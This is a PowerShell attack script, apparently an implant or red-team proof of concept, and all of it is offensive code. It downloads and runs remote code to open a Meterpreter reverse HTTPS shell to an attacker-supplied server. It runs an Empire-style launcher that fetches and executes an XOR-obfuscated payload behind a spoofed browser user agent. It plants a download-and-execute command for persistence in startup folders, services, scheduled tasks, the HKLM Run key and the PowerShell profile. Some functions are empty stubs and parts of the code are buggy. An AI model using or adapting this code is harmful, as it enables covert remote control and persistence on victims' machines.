param (
    [string]$server = $(throw "-server is required"),
    [string]$port = $(throw "-port is required"),
    [string]$child,
    [string]$persistence,
    [string]$elevate
)

$persist = "cmd.exe /c powershell.exe -nop IEX (New-Object Net.Webclient).downloadstring('https://github.com/Gegitech/PowerShell-Persistence-POC/blob/master/persistence.ps1'); Run-Guard;"

#This was too good to let go
function Run-Meterpreter 
{
    IEX (New-Object Net.Webclient).downloadstring(
    'https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/d0fff7b6371ccb52952268f47ae68e85c3aeeb91/CodeExecution/Invoke-Shellcode.ps1'
    )
    Invoke-Shellcode –Payload windows/meterpreter/reverse_https –Lhost $server –Lport $port –Force
}

#Taken from an Empire Launcher
function Run-Empire
{
    param($server, $key)
    $wc=new-object system.net.webclient;
    $u='mozilla/5.0 (windows nt 6.1; wow64; trident/7.0; rv:11.0) like gecko';
    $wc.headers.add('user-agent',$u);
    $wc.proxy = [system.net.webrequest]::defaultwebproxy;
    $wc.proxy.credentials = [system.net.credentialcache]::defaultnetworkcredentials;
    $i=0;
    [char[]]$b=([char[]]($wc.downloadstring("http://$server/index.asp")))|%{$_-bxor$key[$i++%$k.length]};
    iex ($b-join'')
}

function Run-Child 
{
    param([ref]$process)
    $arg = "-NoProfile -ExecutionPolicy unrestricted", "-file $PSScriptRoot\NS.ps1", "-server $server", "-port $port", "-child"
    $process_id = (Start-Process -FilePath powershell.exe -ArgumentList $arg -PassThru).Id
    $process = Get-Process -Id $process_id
}

function Run-Guard
{
    param($date, $server)
    Set-Variable $process = $null
    while ($true)
    {
        if ($process) 
        {
            Sleep 60
        }
        elseif ((Check-DieDate -date $date) -or (Check-ServerDie -server $server))
        {
            exit
        }
        else
        {
            Run-Child $process
        }
    }
}

function Check-DieDate
{
    param($date)
    if(Get-Date -format yyyyMMdd -ge $date)
    {
        return $false
    }
    else
    {
        return $true
    }
}

function Check-ServerDie
{
    param($server)

}

function Persist-StartUpFolder 
{
    param($fileName)
    try 
    {
        $persist | Out-File [Environment]::GetFolderPath('CommonStartup') + '\' + $fileName + '.vbs'
    } 
    catch 
    {
        $persist | Out-File [Environment]::GetFolderPath('Startup') + '\' + $fileName + '.vbs'
    } 
}

function Persist-Service 
{
    param($serviceName, $fileName)
    try 
    {
        $persist | Out-File 'C:\ProgramData\Microsoft\Windows\' + $fileName + '.vbs'
        New-Service -Name $serviceName -BinaryPathName 'C:\ProgramData\Microsoft\Windows\' + $fileName + '.vbs' -StartupType Automatic
    } 
    catch 
    {
        Write-Verbose "Failed to create Service"
    }
}

function Persist-SchTask 
{
    param($taskName, $description, $fileName )
    try 
    {
        $path = [Environment]::GetFolderPath('ApplicationData') + '\' + $fileName + '.vbs'
        $persist | Out-File $path
        $action = New-ScheduledTaskAction -Execute $path
        $trigger = New-ScheduledTaskTrigger -AtStartup
        Register-ScheduledTask -Action $action -Trigger $trigger -TaskName $taskName -Description $description
    } 
    catch 
    {
        Write-Verbose "Failed to create Task"
    }
}

function Persist-AutoRun 
{
    param($name, $fileName)
    try 
    {
        Set-Location HKLM:
        New-Item -Path HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\Run -Name $name -Force
        Set-Item -Path HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\Run\$name -Value $fileName
    }
    catch
    {
        Write-Verbose "Startup key creation failed"
    }
}

function Persist-RegistryBlob 
{
    
}

function Persist-WMI
{
    param($filter, $consumer)
    #Just looked at what the powersploit guys did, this looks painful
}

function Persist-UserProfilePS1 
{
    param($force)
    if(Test-Path $profile or $force) 
    {
        $persist | Out-File -Append
    } 
    else 
    {
        Write-Verbose "User profile file does not exists, use force to force it's creation"
    }
}

if ($child) 
{
    Run-Meterpreter
} 
else 
{
    Run-Guard
}